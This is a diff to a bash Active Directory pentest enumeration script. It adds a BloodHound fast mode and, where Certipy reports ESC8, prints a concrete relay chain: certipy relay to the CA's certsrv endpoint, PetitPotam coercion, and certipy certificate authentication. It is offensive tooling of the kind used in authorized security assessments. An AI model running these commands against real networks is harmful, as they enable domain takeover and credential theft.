@@ -20,13 +20,30 @@ echo -e "${GREY}    https://github.com/fkxdr/fkad${NC}"
 echo ""
 
 # Parse arguments
-while getopts "u:p:d:h" opt; do
+BH_MODE="All"  # Default: full collection
+
+# Pre-process arguments to handle -fast
+ARGS=()
+for arg in "$@"; do
+  if [ "$arg" = "-fast" ]; then
+    BH_MODE="DCOnly"
+  else
+    ARGS+=("$arg")
+  fi
+done
+
+# Reset positional parameters
+set -- "${ARGS[@]}"
+
+while getopts "u:p:d:fh" opt; do
   case $opt in
     u) USERNAME="$OPTARG" ;;
     p) PASSWORD="$OPTARG" ;;
     d) DC_IP="$OPTARG" ;;
+    f) BH_MODE="DCOnly" ;;  # Fast mode: bloodhound domain data only
     h) 
-      echo "Usage: $0 -u username -p password -d dc_ip"
+      echo "Usage: $0 -u username -p password -d dc_ip [-f|-fast]"
+      echo "  -f, -fast    Fast mode: BloodHound DCOnly (skip computer enumeration)"
       exit 0
       ;;
     *) exit 1 ;;
@@ -143,6 +160,42 @@ if [ ! -z "$CERTIPY_CMD" ]; then
       for name in "${!GROUPED[@]}"; do
         echo -e "${RED}       └─ $name: ${GROUPED[$name]}${NC}"
         echo "$name: ${GROUPED[$name]}" >> "$OUTPUT_DIR/adcs_certipy.txt"
+        
+        # ESC8 Exploitation Commands
+        if [[ "${GROUPED[$name]}" =~ ESC8 ]]; then
+          CA_HOST=$(echo "$name" | sed 's/CA://')
+          CA_IP=$(dig +short "$CA_HOST" 2>/dev/null | head -1)
+          
+          # Extract templates suitable for Domain Controllers
+          DC_TEMPLATES=$(awk '
+            /Template Name\s*:/ { 
+              template=$NF; 
+              client_auth=0; 
+              dc_enroll=0; 
+              enabled=0;
+            }
+            /Enabled\s*:\s*True/ { enabled=1 }
+            /Client Authentication\s*:\s*True/ { client_auth=1 }
+            /Enrollment Rights.*Domänencontroller|Domain Controllers|Enterprise Domain Controllers/ { 
+              dc_enroll=1 
+            }
+            /^  [0-9]+$/ { 
+              if (enabled && client_auth && dc_enroll && template != "") {
+                print template
+              }
+              template=""; client_auth=0; dc_enroll=0; enabled=0;
+            }
+          ' "$CERTIPY_TXT" | tr '\n' ', ' | sed 's/,$//')
+          
+          if [ ! -z "$CA_IP" ] && [ ! -z "$DC_TEMPLATES" ]; then
+            FIRST_DC_TEMPLATE=$(echo "$DC_TEMPLATES" | cut -d',' -f1)
+            echo -e "${GREY}       └─ Exploitation (ESC8 - DC Templates):${NC}"
+            echo -e "${GREY}          Available: ${DC_TEMPLATES}${NC}"
+            echo -e "${GREY}          1) certipy-ad relay -target https://${CA_IP}/certsrv/certfnsh.asp -ca ${CA_HOST%%.*} -template ${FIRST_DC_TEMPLATE}${NC}"
+            echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> <TARGET_DC>${NC}"
+            echo -e "${GREY}          3) certipy-ad auth -pfx <output>.pfx -dc-ip ${DC_IP}${NC}"
+          fi
+        fi
       done
     else
       echo -e "${GREEN}[OK] ADCS detected, no exploitable vulnerabilities${NC}"
@@ -198,7 +251,7 @@ UNCON_SYSTEMS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
   "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName 2>/dev/null | \
   grep "^sAMAccountName:" | awk '{print $2}')
 
-NON_DC_UNCON=$(echo "$UNCON_SYSTEMS" | grep -vi "DC[0-9]*\$" | grep -v "^$")
+NON_DC_UNCON=$(echo "$UNCON_SYSTEMS" | grep -vi 'DC' | grep -v "^$")
 NON_DC_COUNT=$(echo "$NON_DC_UNCON" | grep -v "^$" | wc -l)
 
 if [ "$NON_DC_COUNT" -gt 0 ]; then
@@ -305,7 +358,7 @@ fi
 if command -v bloodhound-python &>/dev/null || command -v bloodhound.py &>/dev/null; then
   BH_CMD=$(command -v bloodhound-python 2>/dev/null || command -v bloodhound.py 2>/dev/null)
   cd "$OUTPUT_DIR"
-  $BH_CMD -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c All &>/dev/null
+  $BH_CMD -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c $BH_MODE --zip &>/dev/null
   cd "$CURRENT_PATH"
   
   # Check for BloodHound JSONs
